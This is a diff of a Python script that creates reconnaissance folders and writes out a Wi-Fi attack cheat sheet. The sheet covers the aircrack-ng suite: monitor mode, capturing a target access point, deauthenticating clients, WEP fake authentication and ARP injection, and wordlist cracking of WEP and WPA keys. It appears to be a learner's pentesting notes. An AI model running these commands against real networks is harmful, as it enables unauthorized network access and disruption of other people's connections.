@@ -1,5 +1,6 @@
 
 
+
 # CREATES INDIVIDUAL CATEGORIZED FOLDERS FOR ANY RECONNAISSANCE
 
 # Note: If ran in sudo Permissions will default to "Locked" 
@@ -25,6 +26,10 @@ os.mkdir(sub_four, mode=0o777)
 # [ "os.chmod" can change the permissions of anyy Directory or File created by "os", or any other arugment you use such as "open/write" ]
 
 
+file = open("Txt", "w") 
+file.write("Text Input")
+file.close()
+
 file = open("Man", "w") 
 file.write("""
 
@@ -37,13 +42,16 @@ aircrack-ng
 Monitoring, Recon and Dumping
 
 Using the aircrack-ng suite, Turn on the monitor mode
-sudo airmon-ng start wlan0
+
+[+] sudo airmon-ng start wlan0
 
 Simple passive listening and capture, Used to discover AP in the environment
-sudo airodump-ng wlan0mon
+
+[+] sudo airodump-ng wlan0mon
 
 Targeted listening and capture, Focus on one AP and one channel
-airodump-ng wlan0mon -c 11 --bssid E8:2C:6D.... -w sonic
+
+[+] airodump-ng wlan0mon -c 11 --bssid E8:2C:6D.... -w sonic
 
 Attacking WEP
 
@@ -58,7 +66,7 @@ Deauth connected devices while airodump is running in a separate Terminal to ini
 
 In the airodump-ng Terminal, the WPA handshake will appear once captured
 
-aireplay-ng -0 15 -a 1C:9E:CC:... -c 3C:2E:FF:... wlan0mon
+[+] aireplay-ng -0 15 -a 1C:9E:CC:... -c 3C:2E:FF:... wlan0mon
 
 - 0 means deauthentitcation - - 15 is number of deauths sent
 
@@ -78,11 +86,11 @@ aireplay-ng -0 15 -a 1C:9E:CC:... -c 3C:2E:FF:... wlan0mon
 
 # -h = attacker MAC
 
-aireplay-ng -1 0 -e teddy -a 00:14:7K:7E:40:80 -h 00:0F:9K:88:9K:82 wlan0mon
+[+] aireplay-ng -1 0 -e teddy -a 00:14:7K:7E:40:80 -h 00:0F:9K:88:9K:82 wlan0mon
 
 # ARP Sniffing and injection is another method
 
-aireplay-ng -3 -b 00:14:3C:7E:40:80 -h 00:0F:B5:K8:AC:32 wlan0mon
+[+] aireplay-ng -3 -b 00:14:3C:7E:40:80 -h 00:0F:B5:K8:AC:32 wlan0mon
 
 Aircrack-ng too directly crack the WEP Key
 
@@ -90,7 +98,7 @@ Cracking can be done using aircrack-ng
 
 Note: Use a good Wordlist !
 
-aircrack-ng -a2 -b 28:33:88:0A:3A:CB -w '/home/lock/28:33:88:0A:6A:CB/why_.txt' '/home/lock/beyond-01.cap'
+[+] aircrack-ng -a2 -b 28:33:88:0A:3A:CB -w '/home/lock/28:33:88:0A:6A:CB/why_.txt' '/home/lock/beyond-01.cap'
 
 - a [a.mode]: force attack mode (1/WEP, 2/WPA-PSK)
 - b [bssid]: target selection: access point's MAC
@@ -100,7 +108,7 @@ Other tools like hashcat can be used for cracking a Network, The outfile needs t
 
 Attacking WPA2 PSK w/ HASHCAT (The old way)
 
-aircrack-ng outfile -w wordlist
+[+] aircrack-ng outfile -w wordlist
 
 # But also using other tools like hashcat
 
@@ -166,4 +174,3 @@ After running, airmon-ng check kill to activate adapter to find AP’s
 run, service NetworkManager restart – To turn back on Network wifi
     """) 
 file.close()
-
